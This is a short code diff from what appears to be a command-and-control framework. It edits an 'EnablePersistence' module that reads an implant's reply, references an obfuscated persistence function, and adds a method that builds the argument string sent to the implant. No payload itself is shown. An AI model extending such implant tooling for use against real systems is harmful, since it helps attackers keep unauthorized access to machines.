@@ -4,7 +4,6 @@ class EnablePersistence:
     input = "enable_persistence"
 
     def process_implant_response(self, data, args):
-        print(type(data.decode()))
         if data.decode() == "0":
             return f"Persistence already exists.", None
         else:
@@ -35,3 +34,9 @@ function {{ ron.obf_create_persistence }}(){
         #    Does the file to be uploaded exist local?
         #    Is the command to be executed dangerous?
         return True
+
+
+    def create_module_data_string(self, cmd_entry):
+        # This function is responsible for creating the argument string which is send to the implant.
+
+        return f"{cmd_entry['args']}"
